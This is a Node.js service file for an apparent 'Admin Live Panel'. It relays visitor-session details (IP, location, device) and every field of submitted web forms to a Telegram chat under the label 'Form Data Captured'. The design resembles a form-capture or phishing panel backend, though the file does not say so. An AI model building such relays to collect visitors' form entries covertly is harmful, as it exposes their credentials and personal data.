const { getDb } = require('../database/init');
const config = require('../config/default');

class TelegramService {
  constructor() {
    this.bot = null;
    this.isRunning = false;
  }

  /**
   * Initialize the Telegram bot if a valid token exists in the DB config.
   * Safe to call multiple times — will stop existing bot first.
   */
  async initialize() {
    try {
      const cfg = this.getConfig();
      if (cfg && cfg.bot_token && cfg.is_active) {
        await this._startBot(cfg.bot_token);
      }
    } catch (err) {
      console.error('⚠️  Telegram initialization failed (non-fatal):', err.message);
    }
  }

  /**
   * Start the bot with polling. Stops any existing instance first.
   */
  async _startBot(token) {
    await this.stop();

    try {
      const TelegramBot = require('node-telegram-bot-api');
      this.bot = new TelegramBot(token, {
        polling: {
          interval: config.telegram?.pollingInterval || 1000,
          autoStart: true
        }
      });

      // Suppress polling errors to prevent crashes
      this.bot.on('polling_error', (err) => {
        console.error('⚠️  Telegram polling error:', err.message);
      });

      this.bot.on('error', (err) => {
        console.error('⚠️  Telegram bot error:', err.message);
      });

      this.isRunning = true;
      console.log('✅ Telegram bot started');
    } catch (err) {
      console.error('⚠️  Failed to start Telegram bot:', err.message);
      this.bot = null;
      this.isRunning = false;
    }
  }

  /**
   * Send a formatted HTML alert message to the configured chat.
   */
  async sendAlert(title, message) {
    try {
      const cfg = this.getConfig();
      if (!cfg || !cfg.is_active || !cfg.chat_id || !this.bot) return false;

      const html = `<b>🔔 ${this._escapeHtml(title)}</b>\n\n${message}`;
      await this.bot.sendMessage(cfg.chat_id, html, { parse_mode: 'HTML' });
      return true;
    } catch (err) {
      console.error('⚠️  Telegram sendAlert failed:', err.message);
      return false;
    }
  }

  /**
   * Format and send a new session alert.
   */
  async sendSessionAlert(session) {
    try {
      const cfg = this.getConfig();
      if (!cfg || !cfg.is_active || !cfg.notify_new_session || !cfg.chat_id || !this.bot) return false;

      const lines = [
        `<b>👤 New Visitor Session</b>`,
        ``,
        `🌐 <b>Page:</b> ${this._escapeHtml(session.current_page || 'Unknown')}`,
        `🔗 <b>Referrer:</b> ${this._escapeHtml(session.referrer || 'Direct')}`,
        `💻 <b>Browser:</b> ${this._escapeHtml(session.browser || 'Unknown')}`,
        `🖥️ <b>OS:</b> ${this._escapeHtml(session.os || 'Unknown')}`,
        `📱 <b>Device:</b> ${this._escapeHtml(session.device || 'Unknown')}`,
        `🌍 <b>Location:</b> ${this._escapeHtml(session.city || '')}${session.city && session.country ? ', ' : ''}${this._escapeHtml(session.country || 'Unknown')}`,
        `🔑 <b>IP:</b> <code>${this._escapeHtml(session.ip_address || 'Unknown')}</code>`,
        `🆔 <b>Session:</b> <code>${this._escapeHtml(session.id || '')}</code>`
      ];

      await this.bot.sendMessage(cfg.chat_id, lines.join('\n'), { parse_mode: 'HTML' });
      return true;
    } catch (err) {
      console.error('⚠️  Telegram sendSessionAlert failed:', err.message);
      return false;
    }
  }

  /**
   * Format and send a form data submission alert.
   */
  async sendFormDataAlert(data, website) {
    try {
      const cfg = this.getConfig();
      if (!cfg || !cfg.is_active || !cfg.notify_form_data || !cfg.chat_id || !this.bot) return false;

      const lines = [
        `<b>📝 Form Data Captured</b>`,
        ``,
        `🌐 <b>Website:</b> ${this._escapeHtml(website?.name || 'Unknown')}`,
        `📄 <b>Page:</b> ${this._escapeHtml(data.page || 'Unknown')}`,
        ``
      ];

      // Format each form field
      if (data.fields && typeof data.fields === 'object') {
        lines.push(`<b>📋 Fields:</b>`);
        for (const [key, value] of Object.entries(data.fields)) {
          lines.push(`  • <b>${this._escapeHtml(key)}:</b> ${this._escapeHtml(String(value))}`);
        }
      } else if (data.formData && typeof data.formData === 'object') {
        lines.push(`<b>📋 Fields:</b>`);
        for (const [key, value] of Object.entries(data.formData)) {
          lines.push(`  • <b>${this._escapeHtml(key)}:</b> ${this._escapeHtml(String(value))}`);
        }
      }

      await this.bot.sendMessage(cfg.chat_id, lines.join('\n'), { parse_mode: 'HTML' });
      return true;
    } catch (err) {
      console.error('⚠️  Telegram sendFormDataAlert failed:', err.message);
      return false;
    }
  }

  /**
   * Send an error notification.
   */
  async sendErrorAlert(error) {
    try {
      const cfg = this.getConfig();
      if (!cfg || !cfg.is_active || !cfg.notify_errors || !cfg.chat_id || !this.bot) return false;

      const errorMsg = typeof error === 'string' ? error : (error.message || JSON.stringify(error));
      const stack = error.stack ? `\n\n<pre>${this._escapeHtml(error.stack.substring(0, 500))}</pre>` : '';

      const lines = [
        `<b>🚨 Error Alert</b>`,
        ``,
        `<b>Message:</b> ${this._escapeHtml(errorMsg)}`,
        `⏰ <b>Time:</b> ${new Date().toISOString()}`,
        stack
      ];

      await this.bot.sendMessage(cfg.chat_id, lines.join('\n'), { parse_mode: 'HTML' });
      return true;
    } catch (err) {
      console.error('⚠️  Telegram sendErrorAlert failed:', err.message);
      return false;
    }
  }

  /**
   * Get current Telegram config from the database.
   */
  getConfig() {
    try {
      const db = getDb();
      const row = db.prepare('SELECT * FROM telegram_config WHERE id = 1').get();
      return row || null;
    } catch (err) {
      console.error('⚠️  Failed to get Telegram config:', err.message);
      return null;
    }
  }

  /**
   * Update Telegram config in the database, restart bot if token changed.
   */
  async updateConfig(newConfig) {
    try {
      const db = getDb();
      const current = this.getConfig();

      db.prepare(`
        UPDATE telegram_config SET
          bot_token = ?,
          chat_id = ?,
          is_active = ?,
          notify_new_session = ?,
          notify_form_data = ?,
          notify_errors = ?,
          notify_page_views = ?
        WHERE id = 1
      `).run(
        newConfig.bot_token ?? current?.bot_token ?? '',
        newConfig.chat_id ?? current?.chat_id ?? '',
        newConfig.is_active ?? current?.is_active ?? 0,
        newConfig.notify_new_session ?? current?.notify_new_session ?? 1,
        newConfig.notify_form_data ?? current?.notify_form_data ?? 1,
        newConfig.notify_errors ?? current?.notify_errors ?? 1,
        newConfig.notify_page_views ?? current?.notify_page_views ?? 0
      );

      // Restart bot if token changed or active state changed
      const tokenChanged = newConfig.bot_token !== undefined && newConfig.bot_token !== current?.bot_token;
      const activeChanged = newConfig.is_active !== undefined && newConfig.is_active !== current?.is_active;

      if (tokenChanged || activeChanged) {
        const updatedCfg = this.getConfig();
        if (updatedCfg && updatedCfg.is_active && updatedCfg.bot_token) {
          await this._startBot(updatedCfg.bot_token);
        } else {
          await this.stop();
        }
      }

      return true;
    } catch (err) {
      console.error('⚠️  Failed to update Telegram config:', err.message);
      return false;
    }
  }

  /**
   * Send a test message to verify the connection works.
   */
  async testConnection() {
    try {
      const cfg = this.getConfig();
      if (!cfg || !cfg.bot_token || !cfg.chat_id) {
        return { success: false, error: 'Bot token and chat ID are required' };
      }

      // Create a temporary bot instance for testing if main bot is not running
      let testBot = this.bot;
      let isTemp = false;

      if (!testBot) {
        const TelegramBot = require('node-telegram-bot-api');
        testBot = new TelegramBot(cfg.bot_token, { polling: false });
        isTemp = true;
      }

      const msg = [
        `<b>✅ ALP Connection Test</b>`,
        ``,
        `🎉 Admin Live Panel is successfully connected!`,
        `⏰ <b>Time:</b> ${new Date().toISOString()}`,
        ``,
        `<i>This is a test message from your Admin Live Panel.</i>`
      ].join('\n');

      await testBot.sendMessage(cfg.chat_id, msg, { parse_mode: 'HTML' });

      // Clean up temp bot
      if (isTemp) {
        testBot = null;
      }

      return { success: true };
    } catch (err) {
      return { success: false, error: err.message };
    }
  }

  /**
   * Stop the bot polling gracefully.
   */
  async stop() {
    if (this.bot) {
      try {
        await this.bot.stopPolling();
      } catch (err) {
        // Ignore stop errors
      }
      this.bot = null;
      this.isRunning = false;
      console.log('🔴 Telegram bot stopped');
    }
  }

  /**
   * Escape HTML special characters for safe Telegram message formatting.
   */
  _escapeHtml(text) {
    if (!text) return '';
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }
}

// Export singleton instance
const telegramService = new TelegramService();
module.exports = telegramService;
